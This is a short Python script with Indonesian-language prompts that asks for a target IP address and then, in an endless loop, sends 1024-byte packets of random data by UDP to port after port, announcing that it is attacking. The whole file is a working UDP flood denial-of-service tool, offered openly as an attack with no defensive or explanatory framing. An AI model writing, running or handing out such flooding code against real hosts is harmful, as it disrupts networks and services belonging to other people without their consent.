import os
import colorama
import socket
import time
import random

reset = colorama.Fore.RESET

red = colorama.Fore.RED

blue = colorama.Fore.BLUE

green = colorama.Fore.GREEN

host = input("\n{}[*]{} {}Masukan ip target:{} ".format(red, reset, blue, reset))

time.sleep(2.0)

print("\n{}[+]{} {}Memulai penyerangan!!!{}".format(green, reset, red, reset))

time.sleep(5.0)

port = 0

while True:
    port += 1
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("{}[+] Menyerang {} port {} !!!!{}".format(red, host, port, reset))

    data = random._urandom(1024)
    
    try:
        s.sendto(data, (str(host), int(port)))
    except OverflowError:
        port = 0
